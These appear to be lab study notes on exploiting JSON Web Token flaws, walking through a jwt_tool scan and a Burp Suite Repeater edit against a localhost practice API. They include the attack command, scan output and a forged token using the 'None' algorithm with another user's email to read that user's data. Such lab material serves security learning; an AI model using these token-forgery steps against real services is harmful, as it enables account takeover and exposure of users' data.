
---

# 📖 High-Level Summary:

This lab demonstrates the use of **jwt_tool** to analyze and exploit vulnerabilities in JSON Web Tokens (JWTs). Key findings include:

1. **Broken Signature**: The application does not verify JWT signatures, allowing tampered tokens to be accepted.
2. **Algorithm None**: Changing the algorithm from `RS256` to `None` enables the token to bypass signature verification.

By leveraging these weaknesses, an attacker can manipulate JWTs to access other users' data.

---

# 📚 Definition Bank:

|**Term**|**Definition**|**Key Notes**|
|---|---|---|
|**jwt_tool**|A tool for testing and exploiting vulnerabilities in JSON Web Tokens.|Supports pre-defined attack modules like modifying the signature and algorithm.|
|**JWT (JSON Web Token)**|A token format containing encoded header, payload, and signature sections.|Used for stateless authentication. Vulnerable if the signature is not validated.|
|**Broken Signature**|A vulnerability where the application does not verify the integrity of a tampered token.|Allows attackers to modify tokens without providing a valid signature.|
|**Algorithm None Attack**|A vulnerability where the application accepts `alg: None` as a valid algorithm in the JWT.|Bypasses signature verification entirely.|
|**Repeater (Burp Suite)**|A Burp Suite tool for sending and modifying HTTP requests to test vulnerabilities.|Used here to send modified JWTs to the target application.|

---

# 🎯 Steps and Commands:

### Step 1: Log in to the Dashboard

1. Navigate to:
    
    ```plaintext
    http://localhost:8888/dashboard
    ```
    
2. Observe the `Authorization` header in Burp Suite for the GET request to:
    
    ```plaintext
    /identity/api/v2/user/dashboard
    ```
    
    - **Token Example:**
        
        ```plaintext
        Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWwiOiJHRjDS1zW...randomJWTCharacters
        ```
        

---

### Step 2: Use jwt_tool to Analyze the Token

1. Run the following command in the terminal:
    
    ```bash
    jwt_tool -t http://localhost:8888/identity/api/v2/user/dashboard -rh 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWwiOiJHRjDS1zW...randomJWTCharacters' -M at
    ```
    
2. **Output Example:**
    
    ```plaintext
    [+] Sending token
    jwttool_a9933eb64cf3e12bf8f5d181ae1c126d Sending token Response Code: 200, 179 bytes
    ```
    

---

### Step 3: Analyze Scanning Module Output

1. **Prescan Checks:**
    
    ```plaintext
    jwttool_2242aff88714ddae9c009dea44435317 Broken signature Response Code: 200, 179 bytes
    jwttool_3b804aaab225b15664aed5bc64c51d1e Exploit: "alg":"None" (-X a) Response Code: 404, 58 bytes
    ```
    
    - **Key Findings:**
        - **Broken Signature:** The server accepts tampered tokens without signature verification.
        - **Algorithm None Attack:** Changing the algorithm to `None` bypasses verification.

---

### Step 4: Exploitation via Burp Suite Repeater

1. Send the **GET request** to:
    
    ```plaintext
    /identity/api/v2/user/dashboard
    ```
    
    - Include the **original JWT** in the Authorization header.
2. **Modify the JWT:**
    
    - Use the **JWT tab** in Repeater to edit the token:
        - **Step 1:** Change the algorithm in the header to `"alg": "None"`.
        - **Step 2:** Replace the user identifier in the payload with another user’s email.
    - Example Edited JWT:
        
        ```json
        {
          "header": {
            "alg": "None",
            "typ": "JWT"
          },
          "payload": {
            "email": "otheruser@example.com",
            "iat": 1675347297
          }
        }
        ```
        
3. **Send the Modified Request:**
    
    - Observe the response, which includes the other user’s information.

---

# ✅ Key Takeaways:

1. **Broken Signature**:
    - The application does not verify token integrity, allowing attackers to modify JWTs.
2. **Algorithm None Attack**:
    - Changing the algorithm to `None` bypasses signature verification entirely.
3. **Practical Exploitation**:
    - By using **jwt_tool** and **Burp Suite Repeater**, attackers can manipulate JWTs to impersonate other users and access sensitive data.

---

Let me know if you need further refinements or additional details! 🚀